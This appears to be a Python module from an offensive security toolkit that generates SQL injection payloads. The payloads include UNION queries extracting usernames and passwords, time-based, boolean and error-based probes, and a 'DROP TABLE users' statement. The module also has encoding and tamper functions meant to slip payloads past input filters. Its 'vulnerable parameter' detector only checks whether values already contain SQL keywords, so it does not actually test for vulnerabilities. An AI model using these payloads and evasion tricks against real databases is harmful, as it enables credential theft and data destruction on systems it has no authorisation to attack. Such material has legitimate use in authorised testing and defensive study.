from typing import List, Dict, Any
import re

class SQLInjectionModule:
    def __init__(self):
        self.name = "SQL Injection"
        self.description = "SQL Injection 취약점 테스트 및 페이로드 생성"

    def generate_payloads(self, technique: str = "union") -> List[str]:
        payloads = {
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                "1' UNION SELECT version()--",
            ],
            "time_based": [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
            ],
            "boolean": [
                "' AND '1'='1",
                "' AND 1=1--",
            ],
            "error_based": [
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(1,concat(0x7e,version()),1)--",
            ],
            "stacked": [
                "'; DROP TABLE users;--",
            ]
        }
        return payloads.get(technique, [])

    def encode_payload(self, payload: str, encoding: str = "url") -> str:
        encodings = {
            "url": lambda x: "".join(f"%{ord(c):02x}" if not c.isalnum() and c not in "-_" else c for c in x),
            "base64": lambda x: __import__('base64').b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
        }
        return encodings.get(encoding, encodings["url"])(payload)

    def tamper_payload(self, payload: str, technique: str = "comment") -> str:
        if technique == "comment":
            return payload.replace(" ", "/**/")
        if technique == "space_replace":
            return payload.replace(" ", "%09")
        if technique == "case":
            import random
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        return payload

    def detect_vulnerable_parameters(self, url: str, params: Dict[str, str]) -> List[str]:
        found = []
        for name, value in params.items():
            if any(k in value.lower() for k in ['select', 'union', 'insert', "'", '"']):
                found.append(name)
        return found

    def extract_data_points(self, response: str) -> Dict[str, Any]:
        return {
            "response_length": len(response),
            "has_sql_error": bool(re.search(r"(SQL|mysql|syntax|error)", response, re.I)),
        }
